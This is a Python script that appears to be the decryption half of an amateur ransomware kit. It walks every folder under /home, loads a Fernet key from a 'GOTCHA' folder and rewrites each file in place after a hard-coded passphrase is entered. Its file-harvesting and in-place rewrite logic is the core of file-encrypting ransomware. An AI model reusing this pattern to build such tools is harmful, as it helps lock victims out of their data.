import os
from cryptography.fernet import Fernet

a = "/home"
os.chdir(a)
user = os.listdir() #collect user folder

print(user)

ransompath = "GOTCHA/"

if os.path.exists(ransompath) == False :
	os.mkdir("GOTCHA")


#deklarasi kunci
with open(f"{ransompath}/kunci.txt", "rb") as filekunci :
		kunci = filekunci.read()


#list store
folpath = [] #where to store user folder content path
filepath = [] 


def filecol(fdlist, fol1, file) :
	for path in fdlist :
		child = os.listdir(path)
		print(child)

		
		for item in child :
			abpath = f'{os.path.abspath(path)}/{item}'

			if "kunci.txt" == item or __file__ == item or "ran.py" == item :
				print("DONT")
				continue

			if os.path.isfile(abpath):
				print("list file", file)
				file.append(abpath)

			else :
				print("list folder", fol1)
				fol1.append(abpath)
	filecol2(fol1,file)

# maybe i should assemble both of the filecol func, but idk how :P

def filecol2(folpath,filepath) :
	for folder in folpath :
		child = os.listdir(folder)
		if len(child) == 0 : #remove empty folder from list
			folpath.remove(folder)
			print(folder, "removed")

		for content in child :
			abpath = f'{os.path.abspath(folder)}/{content}'
			
			if "kunci.txt" == content or __file__ == content or "ran.py" == content :
				print("DONT MESS WITH IT")
				continue

			if os.path.isfile(abpath) :
				filepath.append(abpath)

			else :
				folpath.append(abpath)

#i think the reason why i don't need a recursive function is because i append the folder path and it makes everysingle folder in this machine would be added 
#how lucky i am :DD


def Decrypt(filepath, kunci) :
	print("kunci yang digunakan", kunci)
	kata = "hate"
	inputa = input("kata kunci : ")

	if inputa == kata :
		for file in filepath :
			try :
				with open(file, "rb") as act : 
					content = act.read()
				encryptedct = Fernet(kunci).decrypt(content)
	
				with open(file, "wb") as isi :
					isi.write(encryptedct)
	
				print("decrypting", file)

			except :
				print("GAGAL MENGDEKRIPSI FILE", file)
				continue

	else :
		pass


filecol(user, folpath,filepath)

#filecol2(folpath,filepath)

print(folpath)
print(filepath)
print("panjang folpath",len(folpath))
print("panjang filepath", len(filepath))
Decrypt(filepath, kunci) 
